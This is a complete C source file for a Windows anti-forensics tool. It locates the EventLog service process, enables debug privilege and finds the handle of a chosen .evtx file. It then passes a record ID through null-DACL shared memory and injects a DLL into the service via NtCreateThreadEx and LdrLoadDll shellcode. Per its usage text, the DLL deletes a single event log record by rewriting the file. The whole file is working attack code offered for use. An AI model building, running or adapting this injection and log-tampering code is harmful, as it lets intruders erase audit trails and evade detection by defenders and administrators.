#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>  
#pragma comment(lib,"Advapi32.lib") 
#pragma comment(lib, "user32.lib")

#define BUF_SIZE 256
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

DWORD dwProcessID = 0;
HANDLE hProcessHandle = NULL;
LPVOID pAddrStart = NULL;
HANDLE hThreadHandle = NULL;

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS(NTAPI *pRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI *pLdrLoadDll)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef DWORD64(WINAPI *_NtCreateThreadEx64)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD64 dwStackSize, DWORD64 dw1, DWORD64 dw2, LPVOID Unknown);

typedef struct _THREAD_DATA
{
	pRtlInitUnicodeString fnRtlInitUnicodeString;
	pLdrLoadDll fnLdrLoadDll;
	UNICODE_STRING UnicodeString;
	WCHAR DllName[260];
	PWCHAR DllPath;
	ULONG Flags;
	HANDLE ModuleHandle;
}THREAD_DATA, *PTHREAD_DATA;

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI *_NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

HANDLE WINAPI ThreadProc(PTHREAD_DATA data)
{
	data->fnRtlInitUnicodeString(&data->UnicodeString, data->DllName);
	data->fnLdrLoadDll(data->DllPath, data->Flags, &data->UnicodeString, &data->ModuleHandle);
	return data->ModuleHandle;
}

DWORD WINAPI ThreadProcEnd()
{
	return 0;
}


PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[*]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	if (PID == 0)
		printf("[!]Get EventLog's PID error\n");

	return PID;
}

HANDLE MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)
{
	HANDLE hThread = NULL;
	FARPROC pFunc = NULL;

	pFunc = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
	if (pFunc == NULL)
	{
		printf("[!]GetProcAddress (\"NtCreateThreadEx\")error\n");
		return NULL;
	}
	((_NtCreateThreadEx64)pFunc)(&hThread, 0x1FFFFF, NULL, hProcess, pThreadProc, pRemoteBuf, FALSE, NULL, NULL, NULL, NULL);
	if (hThread == NULL)
	{
		printf("[!]MyCreateRemoteThread : NtCreateThreadEx error\n");
		return NULL;
	}

	if (WAIT_FAILED == WaitForSingleObject(hThread, INFINITE))
	{
		printf("[!]MyCreateRemoteThread : WaitForSingleObject error\n");
		return NULL;
	}
	return hThread;
}

BOOL InjectDll(UINT32 ProcessId, char *DllPath)
{
	if (strstr(DllPath, "\\\\") != 0)
	{
		printf("[!]Wrong Dll path\n");
		return FALSE;
	}
	if (strstr(DllPath, "\\") == 0)
	{
		printf("[!]Need Dll full path\n");
		return FALSE;
	}

	size_t len = strlen(DllPath) + 1;
	size_t converted = 0;
	wchar_t* DllFullPath;
	DllFullPath = (wchar_t*)malloc(len * sizeof(wchar_t));
	mbstowcs_s(&converted, DllFullPath, len, DllPath, _TRUNCATE);

	LPVOID pThreadData = NULL;
	LPVOID pCode = NULL;
	HANDLE ProcessHandle = NULL;
	HANDLE hThread = NULL;
	BOOL bRet = FALSE;

	__try
	{
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
		if (ProcessHandle == NULL)
		{
			printf("[!]OpenProcess error\n");
			__leave;
		}
		THREAD_DATA data;
		HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
		data.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
		data.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
		memcpy(data.DllName, DllFullPath, (wcslen(DllFullPath) + 1) * sizeof(WCHAR));
		data.DllPath = NULL;
		data.Flags = 0;
		data.ModuleHandle = INVALID_HANDLE_VALUE;
		pThreadData = VirtualAllocEx(ProcessHandle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pThreadData == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]VirtualAllocEx error\n");
			__leave;
		}

		BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, &data, sizeof(data), NULL);
		if (!bWriteOK)
		{
			CloseHandle(ProcessHandle);
			printf("[!]WriteProcessMemory error\n");
			__leave;
		}

		DWORD SizeOfCode = (DWORD)ThreadProcEnd - (DWORD)ThreadProc;
		pCode = VirtualAllocEx(ProcessHandle, NULL, SizeOfCode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pCode == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]VirtualAllocEx error,%d\n", GetLastError());
			__leave;
		}
		bWriteOK = WriteProcessMemory(ProcessHandle, pCode, (PVOID)ThreadProc, SizeOfCode, NULL);
		if (!bWriteOK)
		{
			CloseHandle(ProcessHandle);
			printf("[!]WriteProcessMemory error\n");
			__leave;
		}

		hThread = MyCreateRemoteThread(ProcessHandle, (LPTHREAD_START_ROUTINE)pCode, pThreadData);
		if (hThread == NULL)
		{
			CloseHandle(ProcessHandle);
			printf("[!]MyCreateRemoteThread error\n");
			__leave;
		}

		WaitForSingleObject(hThread, INFINITE);
		bRet = TRUE;
	}
	__finally
	{
		if (pThreadData != NULL)
			VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE);
		if (pCode != NULL)
			VirtualFreeEx(ProcessHandle, pCode, 0, MEM_RELEASE);
		if (hThread != NULL)
			CloseHandle(hThread);
		if (ProcessHandle != NULL)
			CloseHandle(ProcessHandle);
	}
	return bRet;

}

BOOL FreeDll(UINT32 ProcessId, char *DllFullPath)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot;
	HMODULE hModule = NULL;
	MODULEENTRY32 me = { sizeof(me) };
	BOOL bSuccess = FALSE;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me)) {
		if (!_tcsicmp((LPCTSTR)me.szModule, DllFullPath) ||
			!_tcsicmp((LPCTSTR)me.szExePath, DllFullPath)) {
			bFound = TRUE;
			break;
		}
	}
	if (!bFound)
	{
		printf("[!]CreateToolhelp32Snapshot error\n");
		CloseHandle(hSnapshot);
		return FALSE;
	}

	HANDLE ProcessHandle = NULL;

	ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);

	if (ProcessHandle == NULL)
	{
		printf("[!]OpenProcess error\n");
		return FALSE;
	}

	LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL;
	HMODULE Kernel32Module = GetModuleHandle("Kernel32");
	FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, "FreeLibrary");
	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL)
	{
		CloseHandle(ProcessHandle);
		printf("[!]NtCreateThreadEx error\n");
		return FALSE;
	}
	HANDLE ThreadHandle = NULL;

	NtCreateThreadEx(&ThreadHandle, 0x1FFFFF, NULL, ProcessHandle, (LPTHREAD_START_ROUTINE)FreeLibraryAddress, me.modBaseAddr, FALSE, NULL, NULL, NULL, NULL);
	if (ThreadHandle == NULL)
	{
		CloseHandle(ProcessHandle);
		printf("[!]ThreadHandle error\n");
		return FALSE;
	}
	if (WaitForSingleObject(ThreadHandle, INFINITE) == WAIT_FAILED)
	{
		printf("[!]WaitForSingleObject error\n");
		return FALSE;
	}
	CloseHandle(ProcessHandle);
	CloseHandle(ThreadHandle);
	return TRUE;
}

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		
		printf("Get specified .evtx file's handle and inject a dll(Dll-rewriting.dll),use the dll to delete one eventlog record.\n");
		printf("Delete the eventlog by rewriting the evtx file.\n\n");
		printf("Usage:\n");
		printf("%s <dll full path> <event name> <EventRecordID>\n", argv[0]);
		return 0;
	}

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle;
	ULONG i;
	DWORD offset = 0;
	printf("[+]Dll Path:%s\n", argv[1]);
	printf("[+]Event Name:%s\n", argv[2]);
	printf("[+]EventRecordID:%s\n", argv[3]);
	DWORD pid = getpid();
	wchar_t buf1[100];
	swprintf(buf1, 100, L"%hs", argv[2]);
	_wcslwr_s(buf1, wcslen(buf1) + 1);
	int flag = 0;
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return 0;
	}
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid)))
	{
		printf("[!]Could not open PID %d!\n", pid);
		return 0;
	}
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}
	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo;
		PVOID objectNameInfo;
		UNICODE_STRING objectName;
		ULONG returnLength;
		if (handle.ProcessId != pid)
			continue;
		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			CloseHandle(dupHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength)))
		{
			objectNameInfo = realloc(objectNameInfo, returnLength);
			if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, returnLength, NULL)))
			{
				//		printf("[%#x] %.*S: (could not get name)\n", handle.Handle, objectTypeInfo->Name.Length / 2, objectTypeInfo->Name.Buffer);
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				continue;
			}
		}
		objectName = *(PUNICODE_STRING)objectNameInfo;
		if (objectName.Length)
		{
			_wcslwr_s(objectName.Buffer, wcslen(objectName.Buffer) + 1);
			if (wcsstr(objectName.Buffer, buf1) != 0)
			{
				printf("[+]HandleName:%.*S\n", objectName.Length / 2, objectName.Buffer);
				printf("[+]Handle:%#x\n", handle.Handle);
				offset = handle.Handle;
				flag++;
				if (flag > 1)
				{
					printf("[!]Too many handles\n");
					printf("[!]Stop\n");
					free(objectTypeInfo);
					free(objectNameInfo);
					CloseHandle(dupHandle);
					free(handleInfo);
					CloseHandle(processHandle);
					return 0;
				}
			}
		}
		else
		{
			//			printf("[%#x] %.*S: (unnamed)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
		}
		free(objectTypeInfo);
		free(objectNameInfo);
		CloseHandle(dupHandle);
	}
	free(handleInfo);
	CloseHandle(processHandle);
	printf("[1]Try to CreateFileMapping1\n");
	HANDLE hMapFile1, hMapFile2;
	char *pBuf;
	char *pBuf2;
	char szName1[] = "Global\\SharedMappingObject1";
	char szName2[] = "Global\\SharedMappingObject2";
	DWORD EventRecordID = 32;
	char szOffset[8];
	sprintf_s(szOffset, "%d", offset);

	PSECURITY_DESCRIPTOR pSec = (PSECURITY_DESCRIPTOR)LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!pSec)
	{
		return GetLastError();
	}
	if (!InitializeSecurityDescriptor(pSec, SECURITY_DESCRIPTOR_REVISION))
	{
		LocalFree(pSec);
		return GetLastError();
	}
	if (!SetSecurityDescriptorDacl(pSec, TRUE, NULL, TRUE))
	{
		LocalFree(pSec);
		return GetLastError();
	}
	SECURITY_ATTRIBUTES attr;
	attr.bInheritHandle = FALSE;
	attr.lpSecurityDescriptor = pSec;
	attr.nLength = sizeof(SECURITY_ATTRIBUTES);

	hMapFile1 = CreateFileMapping(INVALID_HANDLE_VALUE, &attr, PAGE_READWRITE, 0, BUF_SIZE, szName1);
	if (hMapFile1 == NULL)
	{
		printf("Could not create file mapping object1 (%d).\n", GetLastError());
		return 0;
	}
	pBuf = (char *)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
	if (pBuf == NULL)
	{
		printf("Could not map view of file1 (%d).\n", GetLastError());
		CloseHandle(hMapFile1);
		return 1;
	}
	CopyMemory((PVOID)pBuf, argv[3], strlen(argv[3]));
	printf("[*]Done\n");
	printf("[2]Try to CreateFileMapping2\n");
	hMapFile2 = CreateFileMapping(INVALID_HANDLE_VALUE, &attr, PAGE_READWRITE, 0, BUF_SIZE, szName2);
	if (hMapFile2 == NULL)
	{
		printf("Could not create file mapping object2 (%d).\n", GetLastError());
		return 0;
	}
	pBuf2 = (char *)MapViewOfFile(hMapFile2, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
	if (pBuf2 == NULL)
	{
		printf("Could not map view of file2 (%d).\n", GetLastError());
		CloseHandle(hMapFile2);
		return 1;
	}
	CopyMemory((PVOID)pBuf2, szOffset, strlen(szOffset));
	printf("[*]Done\n");

	printf("[3]Try to use NtCreateThreadEx to inject dll\n");
	if (InjectDll(pid, argv[1]) != 0)
	{
		printf("[*]Inject dll success\n");
		printf("[*]Try to free dll\n");
		if (FreeDll(pid, argv[1]) != 0)
			printf("[*]Free dll success\n");
		else
			printf("[!]Free error\n");
	}
	else
		printf("[!]Inject dll error\n");
		
	printf("[4]Try to UnmapViewOfFile\n");
	LocalFree(pSec);
	UnmapViewOfFile(pBuf);
	CloseHandle(hMapFile1);
	UnmapViewOfFile(pBuf2);
	CloseHandle(hMapFile2);
	printf("[*]Done\n");
	printf("\n[+]All done.\n");
	return 0;
}